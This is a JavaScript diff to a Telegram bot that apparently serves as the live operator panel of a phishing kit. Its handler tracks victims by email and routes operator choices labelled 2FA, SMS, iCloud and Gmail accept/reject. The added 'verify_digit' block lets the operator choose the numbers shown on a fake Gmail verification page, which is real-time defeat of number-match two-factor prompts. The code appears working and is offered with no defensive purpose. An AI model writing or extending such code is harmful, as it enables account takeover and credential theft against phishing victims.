@@ -31,7 +31,50 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, email] = query.data.split("|");
 
-    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : action === "gmail_accept" ? "GMAIL ACCEPT" : action === "gmail_reject" ? "GMAIL REJECT" : action === "gmail_verify_accept" ? "GMAIL VERIFY ACCEPT" : action === "gmail_verify_reject" ? "GMAIL VERIFY REJECT" : "REJECT"}`);
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : action === "gmail_accept" ? "GMAIL ACCEPT" : action === "gmail_reject" ? "GMAIL REJECT" : action === "gmail_verify_accept" ? "GMAIL VERIFY ACCEPT" : action === "gmail_verify_reject" ? "GMAIL VERIFY REJECT" : action === "verify_digit" ? "VERIFY DIGIT" : "REJECT"}`);
+
+    // ✅ HANDLE VERIFY_DIGIT CALLBACKS (Gmail verification page)
+    if (action === "verify_digit") {
+      const [, requestId, digit] = query.data.split("|");
+      console.log(`📍 Digit ${digit} clicked for requestId: ${requestId}`);
+      
+      try {
+        const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ requestId, digit })
+        });
+        
+        const result = await updateResult.json();
+        console.log(`✅ Digit stored. Count: ${result.selectedCount}`);
+        
+        // If 2 digits are selected, remove the buttons
+        if (result.selectedCount === 2) {
+          try {
+            await bot.editMessageReplyMarkup(
+              { inline_keyboard: [] },
+              { chat_id: query.message.chat.id, message_id: query.message.message_id }
+            );
+            
+            // Send a follow-up message
+            await bot.sendMessage(
+              query.message.chat.id,
+              `✅ <b>Numbers Selected!</b>`,
+              { parse_mode: "HTML" }
+            );
+          } catch (err) {
+            console.error("❌ Error editing message:", err);
+          }
+        }
+
+        await bot.answerCallbackQuery(query.id, { text: `📍 Selected: ${digit}` });
+        return;
+      } catch (err) {
+        console.error("❌ verify_digit error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing digit" });
+        return;
+      }
+    }
 
     // ✅ Map iCloud accept/reject to correct status
     let statusForBackend = action;
